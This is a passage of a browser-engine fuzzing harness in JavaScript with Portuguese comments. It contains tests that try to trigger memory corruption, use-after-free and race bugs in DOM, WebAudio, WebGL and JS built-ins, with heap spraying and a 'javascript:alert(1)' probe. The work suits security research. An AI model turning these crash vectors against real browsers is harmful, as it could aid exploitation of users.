                    sprayHeap();
                    log("Contexto fechado.");
                }, 0);
            }).catch(e => log("Erro Worklet: " + e));
        }

        // ==========================================
        // GRUPO 2: SILENT VECTORS (Corrup√ß√£o L√≥gica)
        // ==========================================

        // --- TESTE 190: Array.flat() Side-Effect Length Leak ---
        // L√≥gica: Array.flat() acessa a propriedade 'length' e itera.
        // Usamos um Proxy para detectar a leitura do length e, nesse momento,
        // reduzimos o array real. Se o algoritmo de 'flat' j√° tiver alocado mem√≥ria
        // baseada no length original, ele pode ler al√©m do novo fim do array.
        function runTest190() {
            log("Iniciando Test 190: Flat Length Leak...");
            
            let arr = [1, 2, 3, 4];
            // Enche com marcadores
            for(let i=4; i<100; i++) arr[i] = 0x41;
            
            let p = new Proxy(arr, {
                get: function(target, prop) {
                    if (prop === "length") {
                        // O motor l√™ o length para saber quanto alocar
                        return target.length;
                    }
                    if (prop === "0") {
                        // Quando come√ßar a ler os dados, cortamos o array
                        log("Lendo √≠ndice 0. Cortando array...");
                        target.length = 0;
                        sprayHeap();
                    }
                    return target[prop];
                }
            });
            
            try {
                // flat() deve tentar ler 100 itens.
                // Mas no item 0, o array vira vazio.
                // O que ele l√™ nos itens 1 a 99?
                let res = Array.prototype.flat.call(p);
                
                log(`Resultado Length: ${res.length}`);
                
                // Verifica se temos dados fantasmas (undefined ou lixo do spray)
                if (res.length > 0 && res[10] !== undefined) {
                    log(`ALERTA: Array fantasma lido! Valor: ${res[10]}`, "alert");
                } else {
                    log("Array.flat seguro (respeitou corte).", "success");
                }
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 191: Map.set() Sealed Object Desync ---
        // L√≥gica: Map usa o hash do objeto como chave.
        // Se selarmos (seal) o objeto e tentarmos for√ßar uma mudan√ßa de propriedade
        // que afetaria seu hash (em implementa√ß√µes fracas) dentro de um loop de set...
        function runTest191() {
            log("Iniciando Test 191: Map/Seal Desync...");
            
            let m = new Map();
            let key = { id: 1 };
            
            m.set(key, "valid");
            
            // Sela o objeto
            Object.seal(key);
            
            // Tenta confundir o Map readicionando a mesma chave selada
            // Algumas engines re-calculam o hash ou tratam objetos selados diferente
            m.set(key, "update");
            
            // Verifica integridade
            if (m.size !== 1) {
                log(`ALERTA: Map duplicou chave selada! Size: ${m.size}`, "alert");
            } else {
                // Tenta recuperar
                if (m.get(key) === "update") {
                    log("Map √≠ntegro (Safe).", "success");
                } else {
                    log("ALERTA: Valor perdido no Map!", "alert");
                }
            }
        }

        // --- TESTE 192: Proxy.ownKeys() Invariant Violation ---
        // L√≥gica: Proxies t√™m invariantes. 'ownKeys' deve retornar chaves de propriedades n√£o-configur√°veis.
        // Se mentirmos sobre isso, o motor JS pode entrar em estado inconsistente ao tentar
        // enumerar propriedades que ele "sabe" que existem, mas o Proxy escondeu.
        function runTest192() {
            log("Iniciando Test 192: Proxy Invariant...");
            
            let target = {};
            Object.defineProperty(target, 'fixed', {
                configurable: false,
                enumerable: true,
                value: 100
            });
            
            let p = new Proxy(target, {
                ownKeys: function() {
                    log("ownKeys chamado. Mentindo sobre 'fixed'...");
                    // Retorna lista vazia, violando a invariante de 'fixed'
                    return [];
                }
            });
            
            try {
                // Object.keys dispara a verifica√ß√£o de invariante
                let keys = Object.keys(p);
                log("Chaves retornadas: " + keys.length);
                
                // Se n√£o lan√ßou erro, o motor engoliu a viola√ß√£o
                log("ALERTA: Viola√ß√£o de invariante ignorada!", "alert");
            } catch(e) {
                // TypeError √© o comportamento correto e seguro
                if (e instanceof TypeError) {
                    log("Motor detectou viola√ß√£o (Safe).", "success");
                } else {
                    log("Erro inesperado: " + e, "info");
                }
            }
        }
// ==========================================
        // 1. SILENT CORRUPTION (Vazamento de Dados)
        // ==========================================

        // TESTE 193: Array.slice Species Trap
        // Usa Symbol.species para enganar o slice e retornar um array menor que o esperado,
        // tentando ler al√©m do limite se o motor otimizou a c√≥pia.
        function runTest193() {
            log("Iniciando Test 193: Species Slice...");
            let arr = [1, 2, 3, 4];
            arr.constructor = {
                [Symbol.species]: function(len) {
                    log("Construtor Species chamado. Retornando array vazio...");
                    return []; // Retorna array menor
                }
            };
            try {
                let res = arr.slice(); // C√≥pia
                if (res.length !== 0 && res[0] === undefined) {
                    log("ALERTA: Array fantasma detectado!", "alert");
                } else {
                    log("Slice seguro.", "success");
                }
            } catch(e) { log("Erro: " + e); }
        }

        // TESTE 194: RegExp Sticky Side-Effect
        // RegExp com flag 'y' e lastIndex modificado via coer√ß√£o de tipo durante a execu√ß√£o.
        function runTest194() {
            log("Iniciando Test 194: RegExp Sticky...");
            let re = /A/y;
            let str = "AAA";
            re.lastIndex = {
                valueOf: () => {
                    log("lastIndex lido. Mudando string...");
                    str = "B"; // Muda a string globalmente
                    sprayHeap();
                    return 0;
                }
            };
            try {
                let res = re.exec(str);
                // Se retornou match 'A' mas a string agora √© 'B', leu mem√≥ria antiga.
                if (res && res[0] === 'A' && str === 'B') {
                    log("ALERTA: Leitura de string antiga (Stale Pointer)!", "alert");
                } else {
                    log("RegExp seguro.", "success");
                }
            } catch(e) { log("Erro: " + e); }
        }

        // TESTE 195: Object.assign Proto Pollution Check
        // Tenta modificar o prot√≥tipo durante a c√≥pia de propriedades.
        function runTest195() {
            log("Iniciando Test 195: Object.assign...");
            let target = {};
            let source = {
                get a() {
                    log("Getter disparado. Alterando proto...");
                    Object.setPrototypeOf(target, null);
                    return 1;
                }
            };
            try {
                Object.assign(target, source);
                log("Assign completo.", "success");
            } catch(e) { log("Erro: " + e); }
        }

        // ==========================================
        // 2. CRASH VECTORS (Corrup√ß√£o de Mem√≥ria)
        // ==========================================

        // TESTE 196: Range.deleteContents Mutation
        // Modifica a √°rvore DOM enquanto 'deleteContents' est√° rodando.
        function runTest196() {
            log("Iniciando Test 196: Range Delete UAF...");
            let div = document.createElement('div');
            div.innerHTML = "<b>Test</b><i>Crash</i>";
            document.body.appendChild(div);
            
            let range = document.createRange();
            range.selectNodeContents(div);
            
            // Observer malicioso
            let obs = new MutationObserver(() => {
                log("Muta√ß√£o! Destruindo div...");
                div.remove();
                sprayHeap();
            });
            obs.observe(div, {childList: true, subtree: true});
            
            try {
                range.deleteContents(); 
                log("Delete safe.");
            } catch(e) { log("Erro: " + e); }
        }

        // TESTE 197: WebAudio Convolver Re-set
        // Troca o buffer de um ConvolverNode enquanto ele processa √°udio.
        function runTest197() {
            log("Iniciando Test 197: Convolver Swap...");
            try {
                let ctx = new (window.AudioContext || window.webkitAudioContext)();
                let conv = ctx.createConvolver();
                
                // Buffer 1
                let b1 = ctx.createBuffer(2, 22050, 44100);
                // Buffer 2
                let b2 = ctx.createBuffer(2, 44100, 44100);
                
                conv.buffer = b1;
                conv.connect(ctx.destination);
                
                // Stress loop
                let i = 0;
                let loop = setInterval(() => {
                    i++;
                    if(i > 50) { clearInterval(loop); ctx.close(); return; }
                    // Troca buffer violentamente
                    conv.buffer = (i % 2 === 0) ? b2 : b1;
                }, 5);
            } catch(e) { log("Audio error: " + e); }
        }

        // TESTE 198: Canvas Pattern Resize Nuke
        // Cria um padr√£o com um canvas que √© redimensionado para 0 no processo.
        function runTest198() {
            log("Iniciando Test 198: Canvas Pattern 0...");
            let c = document.createElement('canvas');
            c.width = 100; c.height = 100;
            let ctx = c.getContext('2d');
            
            let src = document.createElement('canvas');
            src.width = 50; src.height = 50;
            
            // Armadilha
            Object.defineProperty(src, 'width', {
                get: function() { return 0; } // Mente sobre largura ou for√ßa resize
            });
            
            try {
                let p = ctx.createPattern(src, 'repeat');
                ctx.fillStyle = p;
                ctx.fillRect(0,0,100,100);
                log("Pattern safe.");
            } catch(e) { log("Erro: " + e); }
        }

        // ==========================================
        // 3. STATE CORRUPTION (Estados L√≥gicos)
        // ==========================================

        // TESTE 199: CustomElement Upgrade Re-entry
        // Define um elemento customizado que destr√≥i seus atributos durante o upgrade.
        function runTest199() {
            log("Iniciando Test 199: CE Upgrade...");
            class XCrash extends HTMLElement {
                constructor() {
                    super();
                    log("Constructor. Removendo atributo...");
                    this.removeAttribute("id"); // Estado ilegal durante upgrade?
                }
            }
            
            let div = document.createElement('div');
            div.innerHTML = '<x-crash id="target"></x-crash>';
            document.body.appendChild(div);
            
            // Upgrade tardio
            customElements.define('x-crash', XCrash);
            log("Upgrade finalizado.");
        }

        // TESTE 200: Set Iteration Delete/Add Loop
        // Modifica um Set enquanto itera sobre ele para tentar desincronizar o cursor interno.
        function runTest200() {
            log("Iniciando Test 200: Set Desync...");
            let s = new Set();
            s.add(1);
            s.add(2);
            
            let iter = s.values();
            iter.next(); // 1
            
            s.delete(1);
            s.delete(2);
            sprayHeap();
            s.add(3); // Reutiliza bucket?
            
            let res = iter.next(); // Deveria ser 3 ou done
            if (res.value === 2) {
                log("ALERTA: Set retornou elemento deletado!", "alert");
            } else {
                log("Set state ok.", "success");
            }
        }

        // TESTE 201: Detached Iframe Location Write
        // Tenta escrever no 'location' de um iframe que foi removido do DOM.
        function runTest201() {
            log("Iniciando Test 201: Iframe Location...");
            let ifr = document.createElement('iframe');
            document.body.appendChild(ifr);
            let loc = ifr.contentWindow.location;
            
            ifr.remove();
            
            try {
                loc.href = "javascript:alert(1)";
                log("Escrita em location de iframe morto permitida (Suspeito).");
            } catch(e) {
                log("Acesso bloqueado (Safe).", "success");
            }
        }

        // ==========================================
        // 4. RACE CONDITIONS (Timing)
        // ==========================================

        // TESTE 202: MessagePort Transfer Closure
        // Fecha uma porta enquanto ela est√° sendo transferida via postMessage.
        function runTest202() {
            log("Iniciando Test 202: Port Race...");
            let mc = new MessageChannel();
            let p1 = mc.port1;
            
            // Objeto com getter race
            let msg = {
                get p() {
                    log("Getter p. Fechando porta...");
                    p1.close(); // Fecha antes de serializar?
                    return p1;
                }
            };
            
            try {
                window.postMessage(msg, "*", [p1]);
            } catch(e) { log("Erro: " + e); }
        }

        // TESTE 203: Fetch AbortSignal Controller Race
        // Aborta um fetch exatamente quando o stream come√ßa a ser lido.
        function runTest203() {
            log("Iniciando Test 203: Fetch Abort...");
            let ac = new AbortController();
            
            fetch(window.location.href, {signal: ac.signal}).then(res => {
                let reader = res.body.getReader();
                
                // Race: L√™ e aborta
                reader.read();
                ac.abort();
                
                log("Abort enviado durante read.");
            }).catch(e => log("Fetch erro (Esperado): " + e));
        }

        // TESTE 204: Worker Blob URL Revocation
        // Cria um Worker a partir de um Blob e revoga a URL imediatamente.
        function runTest204() {
            log("Iniciando Test 204: Worker Blob Race...");
            let b = new Blob(["self.onmessage=()=>postMessage('ok')"], {type:'text/javascript'});
            let u = URL.createObjectURL(b);
            
            try {
                let w = new Worker(u);
                URL.revokeObjectURL(u); // Revoga instantaneamente
                
                w.postMessage("ping");
                w.onmessage = () => log("Worker respondeu (URL cacheada).", "success");
                w.onerror = () => log("Worker falhou (URL revogada).", "success");
            } catch(e) { log("Erro: " + e); }
        }
// ==========================================
        // 1. SILENT CORRUPTION
        // ==========================================

        // TESTE 205: String.replace Side-Effect
        // Modifica a string original DENTRO da fun√ß√£o de substitui√ß√£o.
        // O motor regex pode usar ponteiros antigos da string original.
        function runTest205() {
            log("Iniciando Test 205: String Replace...");
            let str = "AAAAAA";
            let re = /A/g;
            
            str.replace(re, (match, offset) => {
                if (offset === 0) {
                    log("Primeiro match. Mudando string...");
                    str = "B"; // Muda a refer√™ncia
                    sprayHeap();
                }
                // Se o motor continuar iterando sobre a mem√≥ria antiga de "AAAAAA"
                // mesmo a string sendo "B" agora...
                return "X";
            });
            
            if (str === "B") {
                log("Replace finalizado.", "success");
            } else {
                log("Comportamento an√¥malo.", "alert");
            }
        }

        // TESTE 206: Array.concat Spreadable Lie
        // Usa Symbol.isConcatSpreadable para enganar o concat sobre o tamanho do array.
        function runTest206() {
            log("Iniciando Test 206: Concat Spreadable...");
            let arr = [1, 2, 3];
            let fake = {
                [Symbol.isConcatSpreadable]: true,
                length: 2,
                0: 9,
                get 1() {
                    log("Lendo √≠ndice 1. Zerando arr...");
                    arr.length = 0; // Zera o outro array
                    sprayHeap();
                    return 8;
                }
            };
            
            try {
                // concat l√™ 'fake', roda o getter, zera 'arr'.
                // Se a ordem de c√≥pia for otimizada, pode dar erro.
                let res = [].concat(fake, arr);
                log("Concat size: " + res.length, "success");
            } catch(e) { log("Erro: " + e); }
        }

        // TESTE 207: TypedArray.from Iterator Trap
        // TypedArray.from aceita iterador. Se o iterador neutrar o buffer...
        function runTest207() {
            log("Iniciando Test 207: TypedArray From...");
            let ab = new ArrayBuffer(100);
            let detached = false;
            
            let iter = {
                [Symbol.iterator]: function*() {
                    yield 1;
                    log("Iterador passo 2. Detach...");
                    try {
                         let w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
                         w.postMessage(ab, [ab]);
                    } catch(e){}
                    yield 2;
                }
            };
            
            try {
                // Se TypedArray.from alocou baseado no iterador, mas o buffer morre no meio
                let ta = Uint8Array.from(iter);
                if (ta.length === 2 && ta[1] === 2) log("From seguro.", "success");
                else log("ALERTA: Array incompleto ou corrompido.", "alert");
            } catch(e) { log("Erro: " + e); }
        }

        // ==========================================
        // 2. CRASH VECTORS (Memory)
        // ==========================================

        // TESTE 208: XMLSerializer Getter Mutation
        // XMLSerializer percorre a √°rvore DOM. Se um atributo tiver um getter que 
        // remove o n√≥ atual da √°rvore durante a serializa√ß√£o...
        function runTest208() {
            log("Iniciando Test 208: XMLSerializer...");
            let div = document.createElement('div');
            let attr = document.createAttribute('test');
            div.setAttributeNode(attr);
            
            // Define valor do atributo que causa muta√ß√£o
            // Serializadores antigos acessam .value
            // N√£o podemos por getter em Attr.value facilmente, mas podemos tentar via toString de um objeto
            
            div.setAttribute('test', {
                toString: function() {
                    log("Serializando... Removendo div!");
                    div.remove();
                    sprayHeap();
                    return "crash";
                }
            });
            
            document.body.appendChild(div);
            
            try {
                let s = new XMLSerializer();
                s.serializeToString(div);
                log("Serializa√ß√£o segura.");
            } catch(e) { log("Erro: " + e); }
        }

        // TESTE 209: FontFace Load Event Detach
        // Inicia carregamento de fonte. No evento de conclus√£o/erro, limpa tudo.
        // Tenta acessar propriedades da fonte morta.
        function runTest209() {
            log("Iniciando Test 209: FontFace Detach...");
            let f = new FontFace('X', 'url(x)');
            f.load().then(() => {}, () => {
                log("Fonte falhou. Nuke...");
                // Callback de erro rodando.
                // O objeto C++ FontFace pode estar na pilha.
                f = null;
                sprayHeap();
                // For√ßa GC se poss√≠vel (simulado)
            });
        }

        // TESTE 210: Selection.modify Range Collapse
        // Modifica a sele√ß√£o de texto (cursor) em um elemento edit√°vel
        // enquanto removemos o conte√∫do desse elemento.
        function runTest210() {
            log("Iniciando Test 210: Selection Modify...");
            let div = document.createElement('div');
            div.contentEditable = true;
            div.innerText = "Text to select";
            document.body.appendChild(div);
            div.focus();
            
            let sel = window.getSelection();
            
            // Loop r√°pido
            try {
                sel.modify('move', 'forward', 'character');
                
                log("Modificando sele√ß√£o e DOM...");
                div.innerHTML = ""; // Esvazia
                sprayHeap();
                
                // Tenta modificar em elemento vazio/morto
                sel.modify('move', 'forward', 'character');
                log("Sobreviveu.");
            } catch(e) { log("Erro: " + e); }
        }

        // ==========================================
        // 3. STATE CORRUPTION (Logic)
        // ==========================================

        // TESTE 211: Focus/Blur Zombie Element
        // Remove um elemento durante o evento 'blur'.
        // Verifica se 'document.activeElement' aponta para o elemento removido (zumbi).
        function runTest211() {
            log("Iniciando Test 211: Focus Zombie...");
            let inp = document.createElement('input');
            document.body.appendChild(inp);
            
            inp.onblur = function() {
                log("Blur disparado. Removendo input...");
                inp.remove();
                sprayHeap();
            };
            
            inp.focus();
            inp.blur(); // Dispara evento
            
            setTimeout(() => {
                if (document.activeElement === inp) {
                    log("ALERTA: Elemento focado √© um Zumbi (Removido do DOM)!", "alert");
                } else if (document.activeElement === document.body) {
                    log("Foco voltou ao Body (Safe).", "success");
                }
            }, 10);
        }

        // TESTE 212: History.pushState Limit Bypass
        // Tenta estourar o limite de hist√≥rico ou criar entradas corrompidas
        // passando objetos c√≠clicos ou gigantes que falham na clonagem estruturada tardia.
        function runTest212() {
            log("Iniciando Test 212: History State...");
            let huge = new Uint8Array(1024*1024);
            try {
                // PushState usa StructuredClone
                history.pushState(huge, "test");
                
                // Tenta corromper o estado atual substituindo por algo inv√°lido
                history.replaceState(null, "null");
                
                log("History OK.", "success");
            } catch(e) { log("Erro: " + e); }
        }

        // TESTE 213: Iframe Sandbox Flag Confusion
        // Adiciona sandbox dinamicamente, navega, remove sandbox.
        // Verifica se as restri√ß√µes persistem ou se h√° desincronia.
        function runTest213() {
            log("Iniciando Test 213: Sandbox Flags...");
            let ifr = document.createElement('iframe');
            document.body.appendChild(ifr);
            
            ifr.setAttribute('sandbox', 'allow-scripts');
            
            // Navega
            ifr.src = "javascript:window.secret=1";
            
            setTimeout(() => {
                // Remove sandbox e tenta acessar vari√°vel
                ifr.removeAttribute('sandbox');
                try {
                    let s = ifr.contentWindow.secret;
                    log("Acesso iframe: " + s);
                } catch(e) { log("Acesso negado (Safe/Block)."); }
                ifr.remove();
            }, 100);
        }

        // ==========================================
        // 4. RACE CONDITIONS (Thread)
        // ==========================================

        // TESTE 214: ImageBitmap Closure Race
        // Cria ImageBitmap, transfere para Worker, fecha bitmap.
        // Tudo ao mesmo tempo.
        function runTest214() {
            log("Iniciando Test 214: Bitmap Race...");
            let c = document.createElement('canvas');
            let ctx = c.getContext('2d');
            ctx.fillRect(0,0,10,10);
            
            createImageBitmap(c).then(bmp => {
                let w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=e=>e.data.close()"],{type:'text/js'})));
                
                // Race: Transfere e fecha localmente
                w.postMessage(bmp, [bmp]);
                
                try {
                    bmp.close(); // J√° transferido?
                    log("Close local chamado.");
                } catch(e) { log("Erro (Esperado): " + e.message); }
            });
        }

        // TESTE 215: MessageChannel Post-Close Send
        // Fecha a porta, mas tenta enviar mensagem imediatamente na mesma tick.
        function runTest215() {
            log("Iniciando Test 215: Port Close Race...");
            let mc = new MessageChannel();
            
            mc.port1.onmessage = () => log("ALERTA: Mensagem recebida ap√≥s close?!", "alert");
            
            // Fecha
            mc.port2.close();
            
            // Envia imediatamente (Race condition na fila de eventos)
            try {
                mc.port2.postMessage("ping");
                log("Mensagem enviada na porta fechada (Safe se ignorada).");
            } catch(e) { log("Erro envio: " + e.message); }
        }

        // TESTE 216: Blob Slice Worker Revoke
        // Fatia um blob, manda pro worker, revoga o pai.
        function runTest216() {
            log("Iniciando Test 216: Blob Slice Revoke...");
            let b = new Blob(["test"]);
            let s = b.slice(0, 4);
            
            let u = URL.createObjectURL(s);
            let w = new Worker(URL.createObjectURL(new Blob([`
                fetch('${u}').then(r=>r.text()).then(t=>postMessage(t));
            `],{type:'text/js'})));
            
            w.onmessage = e => {
                if(e.data === "test") log("Worker leu Blob (Safe).", "success");
                else log("Worker leu lixo!", "alert");
            };
            
            // Revoga imediatamente o pai e a url do filho
            URL.revokeObjectURL(u);
            b = null; 
            s = null;
            sprayHeap();
        }
// ==========================================
        // 1. SILENT CORRUPTION
        // ==========================================

        // TESTE 217: Object Shape Transition Confusion
        // Tenta confundir a "Shape" (Map/Structure) do objeto adicionando/removendo propriedades
        // em uma ordem espec√≠fica para for√ßar uma transi√ß√£o incorreta e ler offset errado.
        function runTest217() {
            log("Iniciando Test 217: Shape Confusion...");
            
            // Cria objetos com mesma estrutura inicial
            let o1 = {a: 1, b: 2, c: 3};
            let o2 = {a: 1, b: 2, c: 3};
            
            // Transi√ß√£o 1: Adiciona D
            o1.d = 4;
            o2.d = 4;
            
            // Transi√ß√£o confusa: Deleta B de o1, mas deleta C de o2
            delete o1.b;
            delete o2.c;
            
            // O motor pode tentar compartilhar a estrutura se n√£o for cuidadoso
            // Fun√ß√£o otimizada para ler propriedade 'd'
            function readD(obj) { return obj.d; }
            
            // Treina o IC (Inline Cache)
            for(let i=0; i<1000; i++) readD(o1);
            
            // Passa o objeto com estrutura diferente
            let val = readD(o2);
            
            if (val === 4) {
                log("Leitura correta (Safe).", "success");
            } else {
                log(`ALERTA: Leitura incorreta! Esperado 4, lido: ${val}`, "alert");
            }
        }

        // TESTE 218: Math.expm1 Precision Drift
        // Math.expm1(x) deve ser preciso para x pequeno.
        // Se a implementa√ß√£o C++ usar atalhos inseguros, podemos detectar bits errados.
        function runTest218() {
            log("Iniciando Test 218: Math Precision...");
            
            // Valor muito pequeno
            let x = 1e-15;
            let y = Math.expm1(x);
            
            // expm1(x) ~= x para x pequeno.
            let diff = Math.abs(y - x);
            
            log(`Diff: ${diff}`);
            
            // Se a diferen√ßa for "perfeita" demais (0) ou grande demais, algo est√° errado na FPU/Libm
            if (diff === 0) {
                 log("Precis√£o suspeita (Zero absoluto).", "info");
            } else if (diff > 1e-16) {
                 log("ALERTA: Desvio de precis√£o significativo.", "alert");
            } else {
                 log("Precis√£o dentro do esperado.", "success");
            }
        }

        // TESTE 219: Array.reverse Prototype Hole Leak
        // Inverter array esparso com prot√≥tipo polu√≠do/modificado durante a opera√ß√£o.
        function runTest219() {
            log("Iniciando Test 219: Reverse Hole Leak...");
            
            let arr = [1, , 3]; // Buraco no meio
            
            // Getter no prot√≥tipo para o buraco
            Object.defineProperty(Array.prototype, "1", {
                get: function() {
                    log("Acessando buraco 1. Poluindo...");
                    Array.prototype[0] = "POLLUTED";
                    return "HOLE";
                },
                configurable: true
            });
            
            try {
                // Ao inverter, o motor l√™ o √≠ndice 1?
                // [1, , 3] -> [3, , 1]
                let res = arr.reverse();
                
                // Limpa
                delete Array.prototype["1"];
                delete Array.prototype[0];
                
                log("Reverse: " + res.join(","));
            } catch(e) { log("Erro: " + e); }
        }

        // ==========================================
        // 2. CRASH VECTORS (Memory)
        // ==========================================

        // TESTE 220: AudioNode Channel Interpretation UAF
        // Muda 'channelInterpretation' ("speakers" vs "discrete") repetidamente
        // enquanto o n√≥ est√° conectado e processando √°udio.
        // Isso for√ßa a realoca√ß√£o das tabelas de mixagem internas.
        function runTest220() {
            log("Iniciando Test 220: Audio Channel UAF...");
            try {
                let ctx = new (window.AudioContext || window.webkitAudioContext)();
                let gain = ctx.createGain();
                gain.connect(ctx.destination);
                
                let i = 0;
                let loop = setInterval(() => {
                    i++;
                    if(i>50) { clearInterval(loop); ctx.close(); return; }
                    
                    gain.channelCountMode = (i%2) ? "explicit" : "max";
                    gain.channelInterpretation = (i%2) ? "speakers" : "discrete";
                    
                    // Acesso simult√¢neo aos params
                    gain.gain.value = Math.random();
                }, 2);
            } catch(e) { log("Audio Error: " + e); }
        }

        // TESTE 221: WebGL TransformFeedback Double-Unbind
        // TransformFeedback captura sa√≠da de vertex shader.
        // Tentar desvincular um buffer que j√° foi deletado ou desvinculado
        // durante uma opera√ß√£o ativa.
        function runTest221() {
            log("Iniciando Test 221: TF Double Unbind...");
            let c = document.createElement('canvas');
            let gl = c.getContext('webgl2');
            if(!gl) { log("WebGL2 ausente (Safe)."); return; }
            
            let tf = gl.createTransformFeedback();
            gl.bindTransformFeedback(gl.TRANSFORM_FEEDBACK, tf);
            
            let buf = gl.createBuffer();
            gl.bindBufferBase(gl.TRANSFORM_FEEDBACK_BUFFER, 0, buf);
            
            log("Deletando TF ativo...");
            
            // Destroi enquanto vinculado
            gl.deleteTransformFeedback(tf);
            gl.deleteBuffer(buf);
            
            sprayHeap();
            
            // Tenta usar o contexto
            gl.flush();
            log("Flush OK.");
        }

        // TESTE 222: TextEncoder Stream Integer Overflow
        // Tenta codificar uma string massiva em modo stream para causar
        // overflow no c√°lculo do tamanho do buffer de sa√≠da.
        function runTest222() {
            log("Iniciando Test 222: TextEncoder Overflow...");
            
            let enc = new TextEncoder();
            // Cria string grande (simulada por repeti√ß√£o para n√£o travar JS)
            let chunk = "A".repeat(100000); 
            
            try {
                // encodeInto em buffer pequeno
                let u8 = new Uint8Array(10);
                
                // Se a l√≥gica de c√°lculo de offset falhar, escreve fora de u8
                let res = enc.encodeInto(chunk, u8);
                
                log(`Lido: ${res.read}, Escrito: ${res.written}`);
                
                if (res.written > 10) {
                    log("ALERTA: Buffer Overflow (Escrita > Tamanho)!", "alert");
                } else {
                    log("Bounds check OK.", "success");
                }
            } catch(e) { log("Erro: " + e); }
        }

        // ==========================================
        // 3. STATE CORRUPTION (Logic)
        // ==========================================

        // TESTE 223: WeakMap GC Resilience Desync
        // WeakMap deve segurar refer√™ncias fracas.
        // Se for√ßarmos press√£o de mem√≥ria, a chave deve sumir.
        // Verificamos se o WeakMap entra em estado inconsistente (chave morta mas valor vivo).
        function runTest223() {
            log("Iniciando Test 223: WeakMap GC...");
            let wm = new WeakMap();
            let key = {};
            wm.set(key, "SURVIVOR");
            
            // Remove ref forte
            key = null;
            
            // Tenta for√ßar GC (aloca√ß√£o massiva)
            let pressure = [];
            try {
                for(let i=0; i<10000; i++) pressure.push(new Uint8Array(1024));
            } catch(e){}
            
            // N√£o podemos checar se key morreu diretamente (essa √© a natureza do WeakMap),
            // mas podemos checar se o WM crasha ao ser re-usado.
            wm.set({}, "new");
            log("WeakMap ainda funcional.", "success");
        }

        // TESTE 224: Nested CustomElement Adoption Loop
        // Elemento customizado que adota a si mesmo ou filhos durante callback 'connectedCallback'.
        function runTest224() {
            log("Iniciando Test 224: CE Adoption...");
            
            class BadElem extends HTMLElement {
                connectedCallback() {
                    if (this.hasAttribute('moved')) return;
                    log("Conectado. Adotando em novo doc...");
                    this.setAttribute('moved', '1');
                    
                    let newDoc = document.implementation.createHTMLDocument();
                    try {
                        newDoc.adoptNode(this); // Auto-sequestro
                    } catch(e) { log("Bloqueado: " + e.message); }
                }
            }
            customElements.define('bad-elem', BadElem);
            
            let el = document.createElement('bad-elem');
            document.body.appendChild(el);
        }

        // TESTE 225: History State Cyclic Object Trap
        // PushState com objeto c√≠clico (A aponta para B, B aponta para A).
        // StructuredClone deve lidar com isso, mas implementa√ß√µes antigas falhavam recursivamente.
        function runTest225() {
            log("Iniciando Test 225: History Cycle...");
            
            let a = {};
            let b = { parent: a };
            a.child = b;
            
            try {
                history.pushState(a, "cycle");
                log("Ciclo aceito (Clone robusto).", "success");
            } catch(e) {
                // DataCloneError √© aceit√°vel, mas Crash n√£o
                log("Erro: " + e.message);
            }
        }

        // ==========================================
        // 4. RACE CONDITIONS (Thread)
        // ==========================================

        // TESTE 226: BroadcastChannel Close/Post Race
        // Canal de comunica√ß√£o entre janelas/tabs.
        // Fechar e postar simultaneamente.
        function runTest226() {
            log("Iniciando Test 226: Broadcast Race...");
            let bc = new BroadcastChannel('test_channel');
            
            bc.onmessage = () => log("Msg recebida.");
            
            // Race
            bc.close();
            try {
                bc.postMessage("ghost");
                log("Post ap√≥s close sem erro (Safe).");
            } catch(e) {
                log("Erro post: " + e.message);
            }
        }

        // TESTE 227: Cache API Match/Delete Race
        // Cache Storage (Service Workers).
        // Tenta deletar uma entrada enquanto faz 'match' (leitura) dela.
        function runTest227() {
            log("Iniciando Test 227: Cache Race...");
            
            if (!window.caches) { log("Cache API ausente."); return; }
            
            caches.open('race-cache').then(cache => {
                let req = new Request('/test');
                cache.put(req, new Response('data')).then(() => {
                    log("Item salvo. Iniciando race...");
                    
                    // Leitura
                    cache.match(req).then(r => {
                        if(r) log("Match sucesso.");
                    });
                    
                    // Dele√ß√£o simult√¢nea
                    cache.delete(req);
                });
            });
        }

        // TESTE 228: ResizeObserver/Fullscreen Toggle Storm
        // ResizeObserver dispara ao mudar tamanho.
        // Fullscreen muda tamanho drasticamente.
        // Alternar fullscreen dentro do callback do observer.
        function runTest228() {
            log("Iniciando Test 228: Resize/Fullscreen...");
            
            let div = document.createElement('div');
            document.body.appendChild(div);
            
            let count = 0;
            let ro = new ResizeObserver(() => {
                count++;
                if(count > 10) { ro.disconnect(); return; }
                
                // Tenta requestFullscreen (geralmente bloqueado sem user gesture, mas testamos a l√≥gica)
                // Se falhar, mudamos o estilo para simular resize
                div.style.width = (count % 2 === 0) ? "100px" : "200px";
                
                // Acesso a layout for√ßado
                let w = div.offsetWidth;
            });
            
            ro.observe(div);
            div.style.width = "50px"; // Trigger inicial
            
            setTimeout(() => div.remove(), 500);
        }
 // --- SILENT ---
        
        function runTest229() {
            log("Test 229: BigInt64 Reinterpretation");
            if(!window.BigInt64Array) return log("No BigInt support");
            let b = new ArrayBuffer(8);
            let f64 = new Float64Array(b);
            let i64 = new BigInt64Array(b);
            let v = 0x7FF0000000000001n; // Signaling NaN payload
            i64[0] = v;
            // Check if engine canonicalizes NaN incorrectly preserving bits
            if(Number.isNaN(f64[0])) {
                let check = new BigInt64Array(b)[0];
                if(check === v) log("Bitwise integrity OK.", "success");
                else log(`ALERT: NaN Canonicalization mutation! ${check.toString(16)}`, "alert");
            }
        }

        function runTest230() {
            log("Test 230: Sort Resize Trap");
            let a = new Array(100).fill(1);
            let trapped = false;
            try {
                a.sort((x, y) => {
                    if (!trapped) {
                        a.length = 1; 
                        spray();
                        trapped = true;
                    }
                    return x - y;
                });
                log("Sort complete. Len: " + a.length, "success");
            } catch(e) { log("Sort error: " + e.message); }
        }

        function runTest231() {
            log("Test 231: JSON Proxy Leak");
            let t = {a:1};
            let p = new Proxy(t, {
                get(tgt, key) {
                    if(key === 'toJSON') {
                        delete tgt.a;
                        tgt.b = 2; // Shift structure
                        spray();
                    }
                    return Reflect.get(tgt, key);
                }
            });
            try {
                let s = JSON.stringify(p);
                if(s === '{}' || s === '{"b":2}') log("JSON safe: " + s, "success");
                else log(`ALERT: Ghost property leaked: ${s}`, "alert");
            } catch(e) { log(e); }
        }

        // --- CRASH ---

        function runTest232() {
            log("Test 232: Canvas Recursion");
            let c = document.createElement('canvas');
            let ctx = c.getContext('2d');
            let d = 0;
            function r() {
                d++;
                if(d > 500) { c.width=0; spray(); return; }
                ctx.save();
                ctx.beginPath();
